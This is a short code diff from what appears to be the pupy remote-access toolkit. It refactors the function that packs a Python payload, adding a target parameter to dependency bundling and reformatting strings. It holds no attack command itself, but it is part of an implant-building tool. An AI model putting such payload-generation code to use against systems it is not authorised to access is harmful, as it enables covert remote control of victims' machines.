@@ -18,28 +18,34 @@ from pupylib import ROOT
 
 
 def getLinuxImportedModules():
-    '''
-    '''
-    lines = ""
-    with open(os.path.join(ROOT, "conf", "imports_done.py")) as f:
+    lines = ''
+
+    with open(os.path.join(ROOT, 'conf', 'imports_done.py')) as f:
         lines = f.read()
+
     return lines
 
 
-def pack_py_payload(display, conf, debug=False, autostart=True):
+def pack_py_payload(target, display, conf, debug=False, autostart=True):
     display(Success('Generating PY payload ...'))
 
-    stdlib = dependencies.importer((
-        'pyasn1', 'rsa', 'pyaes',
-        'netaddr', 'tinyec', 'umsgpack',
-        'poster', 'win_inet_pton', 'http_parser',
-        'urllib_auth',
-    ), ignore_native=True, as_dict=True)
+    stdlib = dependencies.importer(
+        target, (
+            'pyasn1', 'rsa', 'pyaes',
+            'netaddr', 'tinyec', 'umsgpack',
+            'poster', 'win_inet_pton', 'http_parser',
+            'urllib_auth',
+        ),
+        ignore_native=True, as_dict=True
+    )
 
     stdlib.update(
-        dependencies.importer((
-            'network', 'pupy'
-        ), path=ROOT, as_dict=True)
+        dependencies.importer(
+            target, (
+                'network', 'pupy'
+            ),
+            path=ROOT, as_dict=True
+        )
     )
 
     payload = dependencies.bootstrap(
